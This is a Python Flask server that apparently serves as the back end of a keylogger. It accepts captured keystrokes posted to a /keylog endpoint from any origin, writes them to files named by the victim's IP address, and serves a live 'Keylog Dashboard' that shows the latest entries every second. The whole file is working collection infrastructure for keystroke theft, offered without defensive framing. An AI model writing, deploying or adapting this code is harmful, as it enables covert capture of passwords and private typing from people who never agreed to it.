from flask import Flask, request
from flask_restful import Api, Resource, reqparse
from flask_cors import CORS
from datetime import datetime
import logging
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)
CORS(app)

@app.route('/keylog', methods=['POST'])
def post():
    parser = reqparse.RequestParser()
    parser.add_argument('logged', required=True)
    args = parser.parse_args()
    logged = args['logged']

    logging.info(f"[KEYLOG] Received: {logged}")  # 👈 Will show up in Render Logs

    source = request.remote_addr
    savelogs(logged, source)
    return {'message' : source + ": " + logged }, 200

@app.route('/home', methods=['GET'])
def home():
    return {'message' : "Welcome"}, 200
@app.route('/logs', methods=['GET'])
def logs():
    try:
        with open("127.0.0.1.log", "r") as f:  # Change filename if needed
            lines = f.readlines()[-50:]  # Last 50 lines
        return {'logs': lines}, 200
    except FileNotFoundError:
        return {'logs': ["No logs found."]}, 200
@app.route('/dashboard')
def dashboard():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Keylog Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; }
            h1 { color: #333; }
            #logs { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            .log-line { border-bottom: 1px solid #ddd; padding: 5px; }
        </style>
    </head>
    <body>
        <h1>🔐 Live Keylog Dashboard</h1>
        <div id="logs">Loading...</div>

        <script>
            function fetchLogs() {
                fetch('/logs')
                    .then(response => response.json())
                    .then(data => {
                        const logContainer = document.getElementById('logs');
                        logContainer.innerHTML = '';
                        data.logs.forEach(line => {
                            const div = document.createElement('div');
                            div.className = 'log-line';
                            div.textContent = line;
                            logContainer.appendChild(div);
                        });
                    })
                    .catch(err => {
                        document.getElementById('logs').innerText = "Error loading logs.";
                    });
            }

            setInterval(fetchLogs, 1000);  // Refresh every second
            fetchLogs();
        </script>
    </body>
    </html>
    '''


def savelogs(log, source):
    now = datetime.now()
    nowtime = now.strftime("%d-%m-%Y_%H:%M:%S")
    line = f"{nowtime} ({source}): {log}"
    print(line)  # ✅ Print to Render Logs
    # Optional: Save to file (ephemeral)
    try:
        with open(source + ".log", "a") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"File write error: {e}")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
